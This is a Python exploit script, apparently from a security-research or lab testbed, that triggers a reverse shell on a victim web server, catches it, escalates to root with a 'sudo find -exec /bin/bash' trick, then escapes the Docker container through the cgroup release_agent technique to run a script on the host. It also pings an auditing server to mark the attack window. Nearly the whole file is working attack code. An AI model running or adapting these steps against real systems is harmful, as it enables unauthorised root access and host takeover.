import socket, sys, time, os, requests, datetime, re, random, errno, pty, subprocess, sys
import threading

# DISCLAIMER
# I utilized as base code for this listener the code found on:
# https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

def listen(ip, port, general_info):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print(color.GREEN + "[+]" + color.END + " Listening on port " + str(port))
	conn, addr = s.accept()
	try:
		print(color.GREEN + "[+]" + color.END + ' Connection received from ',addr)
		
		# Inform the Logging server
		if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1)) 
			except requests.exceptions.ReadTimeout:
			    		pass
			except requests.exceptions.ConnectTimeout:
			    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
		
		# Commands in order to get root access
		# In order to escalate privilege we will assume the docker has permission to run sudo find (simulating a, not so likely but possible, vulnerability)
		escalation = ['cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
		for cmd in escalation:
			# Avoid stalling for ever
			conn.settimeout(1.0)
			try:
				ans = conn.recv(4194304).decode()
				#sys.stdout.write(ans)
			except socket.timeout:
				# This will happen once we open the root shell because the input will be empty
				pass
			
			conn.settimeout(None)
			conn.send(cmd.encode())
			time.sleep(0.30)
			#sys.stdout.write("\033[A" + ans.split("\n")[-1])
		# Whatever you put inside the $dir/escapingDocker script will be executed on the host
		# with high privileges
		escape= ['rm -drf /tmp/cgroup_mount/ >/dev/null 2>&1\n',
			 'mkdir /tmp/cgroup_mount >/dev/null 2>&1\n',
			 'mount -t cgroup -o rdma cgroup /tmp/cgroup_mount/ >/dev/null 2>&1\n',
			 'mkdir /tmp/cgroup_mount/test\n',
			 'echo 1 > /tmp/cgroup_mount/test/notify_on_release\n',
			 r'''dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)''' + "\n",
			 'echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent\n',
			 '''echo '#!/bin/sh' > /escapingDocker\n''',
			 '''echo 'ps aux >> '$dir'/output' >> /escapingDocker\n''',
			 '''echo 'echo "PoC, injected through the container" > /File_on_Host' >> /escapingDocker\n''',
			 'chmod a+x /escapingDocker\n',
			 'sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
		print(color.GREEN + "\n\n\n[*]" + color.END + " Executing Exploit, please wait")
		# Wait for threads
		time.sleep(0.7)
		print(color.GREEN + '[*]' + color.END + ' Proceeding with Docker escape:')
		for cmd in escape:
			# Avoid stalling for ever
			print('\t' + color.BOLD + cmd.replace('\n', '') + color.END, end =" ")
			conn.settimeout(0.6)
			try:
				ans = conn.recv(4194304).decode()
				# sys.stdout.write(ans) # We could print the output but it won't show much, other than possible errors that most likely dont affect the result 
			except socket.timeout:
				# This will happen once we open the root shell because the input will be empty
				pass
			print(color.GREEN + ' [✓]' + color.END)
			conn.settimeout(None)
			conn.send(cmd.encode())
			time.sleep(0.30)
		print(color.GREEN + '\n[*]' + color.END + color.BOLD +' Done!\nTo confirm the attack was successful, on the victim host, check the existence of the file /File_on_Host\n' + color.END)
		cleanup(conn, general_info)
	
	except KeyboardInterrupt:
		if conn:
			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
			cleanup(conn, general_info)
			time.sleep(0.2)
			conn.close()
			s.close()
	conn.close()


def listen_shell(victim_info, attacker_info, general_info, secure):
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(attacker_info['ip'], r_port):
		r_port = random.randint(1024, 65536)
	s = ''
	if secure:
		s = 's'
	else:
		s = ''
	
	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port'], s))
	get_access.start() # Access the page that contains the reverse shell in order to establish connection
	listen(attacker_info['ip'],int(attacker_info['port']), general_info)


def task(v_ip, v_port, s=''):

	time.sleep(1)
	now = datetime.datetime.now()
	print(color.GREEN + '[*]' + color.END + ' Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http' + s + '://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		f.close()
		print(color.GREEN + '[*]' + color.END + ' Making request to execute reverse shell ', url, flush=True)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit(color.RED + '[-] We couldn\'t find the exploit in the victim server, check if the server is alive' + color.END)
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print(color.GREEN + '[*]' + color.END + ' The exact time before lauching the exploit was: ', now, flush=True)
		print(color.GREEN + '[*]' + color.END + ' You can use this time to help you filter the syscall logs', flush=True)
		

	else:
		print(color.RED + '[-] URL wasn\'t generated, you might need to run the exploit another time' + color.END)
		print(color.RED + '[-] If the problem persists, please confirm the information you passed' + color.END)
		
		sys.exit()
		
			
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()

def cleanup(conn, general_info):
	conn.send('umount /tmp/cgroup_mount && rm -drf /tmp/cgroup_mount\n'.encode())
	if general_info['active'] == 'True':
		try:
			# The pid here is random, we dont really to specify it
			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
		except requests.exceptions.ReadTimeout:
		    		pass
		except requests.exceptions.ConnectTimeout:
		    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)


def informAudittingStart(general_info):
	exploit = 'Docker'
	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
	return url

def informAudittingStop(general_info):
	exploit = 'Docker'
	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
	return url
